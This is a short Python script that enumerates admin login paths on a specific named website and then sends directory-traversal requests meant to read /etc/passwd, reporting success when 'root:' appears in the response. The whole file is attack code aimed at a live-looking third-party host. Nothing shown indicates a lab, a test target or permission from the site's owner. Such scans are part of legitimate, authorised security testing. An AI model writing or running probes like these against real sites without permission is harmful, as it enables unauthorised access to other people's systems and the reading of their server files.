#!/usr/bin/env python3
import requests

def test_admin_access():
    print("Testing Admin Page Access")
    print("=" * 40)
    
    target = "https://uplinkai.in/"
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    # Test admin page access
    admin_paths = [
        '/admin',
        '/admin/',
        '/administrator',
        '/admin/login',
        '/admin/index',
        '/wp-admin',
        '/phpmyadmin',
        '/login',
        '/dashboard',
        '/control-panel'
    ]
    
    print("Testing admin paths...")
    for path in admin_paths:
        try:
            print(f"\nTesting: {path}")
            response = session.get(target + path, timeout=10)
            
            print(f"  Status Code: {response.status_code}")
            print(f"  Content Length: {len(response.text)} bytes")
            
            # Check for admin-related content
            content_lower = response.text.lower()
            admin_indicators = ['admin', 'login', 'dashboard', 'control', 'panel', 'management']
            
            found_indicators = []
            for indicator in admin_indicators:
                if indicator in content_lower:
                    found_indicators.append(indicator)
            
            if found_indicators:
                print(f"  🚨 ADMIN CONTENT DETECTED: {found_indicators}")
                # Extract relevant content
                lines = response.text.split('\n')
                for line in lines[:20]:  # Check first 20 lines
                    if any(indicator in line.lower() for indicator in admin_indicators):
                        print(f"    Found: {line.strip()}")
            else:
                print(f"  ✅ No admin content detected")
                
        except Exception as e:
            print(f"  ❌ Error: {e}")
    
    # Test for authentication bypass using directory traversal
    print("\n" + "=" * 40)
    print("Testing Authentication Bypass via Directory Traversal...")
    
    bypass_payloads = [
        '/admin/../admin',
        '/admin/./admin',
        '/admin/../../../admin',
        '/admin?file=../../../etc/passwd',
        '/admin/login?redirect=../../../etc/passwd'
    ]
    
    for payload in bypass_payloads:
        try:
            print(f"\nTesting bypass: {payload}")
            response = session.get(target + payload, timeout=10)
            
            print(f"  Status: {response.status_code}")
            print(f"  Length: {len(response.text)}")
            
            if 'root:' in response.text:
                print("  🚨 DIRECTORY TRAVERSAL SUCCESSFUL!")
            
        except Exception as e:
            print(f"  ❌ Error: {e}")

if __name__ == "__main__":
    test_admin_access()
